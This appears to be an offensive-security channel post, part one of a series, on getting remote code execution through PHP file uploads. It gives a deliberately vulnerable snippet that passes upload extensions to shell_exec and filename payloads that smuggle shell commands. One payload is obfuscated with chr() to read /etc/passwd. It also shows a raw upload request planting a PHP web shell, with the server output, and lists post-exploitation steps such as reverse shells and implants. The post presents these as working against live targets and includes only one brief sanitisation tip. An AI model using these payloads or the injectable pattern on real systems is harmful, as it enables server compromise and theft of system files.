![Advanced RCE Techniques](https://github.com/user-attachments/assets/f40023cd-40d1-407e-8c0a-f66cdc6d0d67)

# 🚨 Advanced RCE Techniques via File Extensions, PHP Uploads & SSTI [Part 1/2]

## 💥 [Part 1] From a simple filename to Remote Code Execution (RCE)
In Part 1 post, we’ll deep dive into how small overlooked features in web apps lead to full server compromise. These methods are real, tested, and exploitable in live targets.

---

### [1/20] 🧠 Mindset: Small Inputs, Big Impact
Most developers don’t think a filename, a template, or a simple form can lead to full RCE. But they can. Always ask: _"Where does my input go behind the scenes?"_

---

### [2/20] 🐚 Shell Injection via File Extension
Let’s start with one of the most ignored injection points — the file extension.

#### 🔎 Vulnerable PHP snippet:
```php
$ext = pathinfo($file["name"], PATHINFO_EXTENSION);
$filepath = $base_dir . uniqid() . '.' . $ext;
$command = "ffprobe -i \"$filepath\" ...";
shell_exec($command);
```

☠️ The pathinfo() function blindly extracts extension and passes it to shell.

---

### [3/20] 💥 Payload to Trigger Command Execution
Upload:
```makefile
filename: 02.mp3";id;#
```
Which results in:
```bash
ffprobe -i "/uploads/abc.mp3";id;#"
```
✅ `id` command is executed on the server.

---

### [4/20] 😈 Obfuscated Command Injection
Want to dump `/etc/passwd` without using restricted characters?

#### Payload:
```php
02.mp3";php -r '$sl=chr(47);echo shell_exec("cat ${sl}etc${sl}passwd");';#
```

🔥 Uses `chr()` to bypass character restrictions.

---

### [5/20] 🔄 Real-World Consequences
This flaw can lead to:
- Shell access
- File exfiltration
- Lateral movement
- Privilege escalation

---

### [6/20] 💡 Tip: Sanitize Extensions
Always sanitize filename extensions server-side, even if the upload is client-validated. Avoid passing unescaped strings into any shell function.

---

### [7/20] ☠️ Arbitrary PHP File Upload – Still Alive in 2025
Classic file upload RCE example. Often found in legacy systems.

---

### [8/20] 🧪 Sample Malicious Upload Request
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=123

--123
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system('cat /etc/passwd'); ?>
--123--
```

---

### [9/20] 🎯 Execution & Confirmation
URL:
```bash
GET /uploads/images/shell.php
```

Output:
```ruby
root:x:0:0:root:/root:/bin/bash
...
```

---

### [10/20] 🔥 Power of File Upload RCE
After initial RCE, you can:
- Deploy reverse shells
- Drop persistent implants
- Access internal networks
- Open tunnels and pivot

---

📢 **Coming Soon: Part 2 – Advanced SSTI Payloads & Post Exploitation**

For more real-world PoCs, deep dives, and offensive security tactics:  
👉 Join [@cybersecplayground](https://t.me/cybersecplayground)

---

#RCE #BugBounty #PHP #SSTI #CyberSecurity #CTF #Exploit #Payloads #cybersecplayground
